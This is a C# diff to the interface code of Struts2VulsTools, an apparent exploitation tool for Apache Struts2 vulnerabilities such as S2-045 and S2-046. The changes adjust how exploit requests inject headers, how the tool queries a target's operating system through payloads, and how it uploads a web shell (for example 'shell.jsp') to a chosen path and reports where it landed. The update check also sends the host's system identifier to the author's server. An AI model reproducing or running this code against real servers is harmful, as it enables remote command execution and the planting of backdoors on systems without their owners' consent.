@@ -113,6 +113,7 @@ namespace Test
                 {
                     request.Method = "POST";
                     request.ContentType = "multipart/form-data";
+                    request.AddMuHeader("\"" + data + "\"", "x");
                 }
                 else
                 {
@@ -137,10 +138,6 @@ namespace Test
                 {
                     request.ContentType = exp;
                     
-                }
-                else {
-
-                    request.AddMuHeader("\"" + data + "\"", "x");
                 }
 
                 String body = request.GetBody(data);
@@ -321,7 +318,7 @@ namespace Test
             else if (!vul.Equals("S2-045") && !vul.Equals("S2-046"))
             {
 
-                result = Tools.getContent(request(method, url, "", bp.Get_Exp_VerInfo("os.name"), cookie, vul), vul) + "\r\n";
+                result = Tools.getContent(request(method, url, bp.Get_Exp_VerInfo("os.name"),"" , cookie, vul), vul) + "\r\n";
                 result += Tools.getContent(request(method, url, bp.Get_Exp_VerInfo("os.version"), "", cookie, vul), vul) + "\r\n";
                 result += Tools.getContent(request(method, url, bp.Get_Exp_Path(), "", cookie, vul), vul) + "\r\n";
             }
@@ -441,7 +438,7 @@ namespace Test
             this.btn_exeBatchCMD.Enabled = true;
         }
 
-        public static int version = 20190617;
+        public static int version = 20190925;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=Struts2VulsTools&NO=" + URLEncode.UrlEncode(Tools.getSystemSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -534,11 +531,22 @@ namespace Test
             String url = this.txt_url.Text;
             String cookie = this.txt_cookie.Text;
             String result = Tools.getContent(uploadFile(url,shellPath, shellName,cookie,this.com_vul.Text), this.com_vul.Text);
-
+            String path = "";
+            String pathfilename = "";
             if (result.IndexOf("okokok") != -1)
             {
-                MessageBox.Show("上传成功----" + getFilePath(url, result, shellName));
-                LogError("上传访问路径：" + getFilePath(url, result, shellName));
+                if (this.setUploudPath.Checked&& !"".Equals(shellPath))
+                {
+
+                    path = shellPath;
+                    pathfilename = shellPath + shellName;
+                }
+                else {
+                    pathfilename = getFilePath(url, result, shellName);
+                }
+                MessageBox.Show("上传成功----" + pathfilename);
+
+                LogError("上传访问路径：" + pathfilename);
             }
             else {
                 LogError("上传失败！");
@@ -554,7 +562,7 @@ namespace Test
             if (c != -1)
             {
                 String cpath = result.Substring(c);
-                return rootPath + cpath.Replace("okokok","")+ "/"+ fileName;
+                return rootPath + result.Replace("okokok","")+ "/"+ fileName;
             }
             else {
                 return "未获取到shell路径，请人工访问。";
@@ -568,9 +576,8 @@ namespace Test
             String fileContent = this.txt_shellContent.Text;
             String fileContent_encode = System.Web.HttpUtility.UrlEncode(fileContent, Encoding.UTF8);
             String path = "";
-            if (!"如：/home/web/shell.jsp".Equals(shellPath) && !"".Equals(shellPath))
+            if (this.setUploudPath.Checked && !"".Equals(shellPath))
             {
-
                 path = shellPath;
             }
             BasePayload bp = getPayload(vulName);
@@ -1075,6 +1082,18 @@ namespace Test
             if (this.cmb_method.Text.Equals("复杂数据") && (this.com_vul.Text.Equals("S2-045") || this.com_vul.Text.Equals("S2-046")))
             {
                 MessageBox.Show("S2-045,S2-046不支持复杂数据类型提交！");
+            }
+        }
+
+        private void setUploudPath_CheckStateChanged(object sender, EventArgs e)
+        {
+            if (this.setUploudPath.Checked)
+            {
+                this.txt_shellPath.Enabled = true;
+            }
+            else
+            {
+                this.txt_shellPath.Enabled = false;
             }
         }
     }
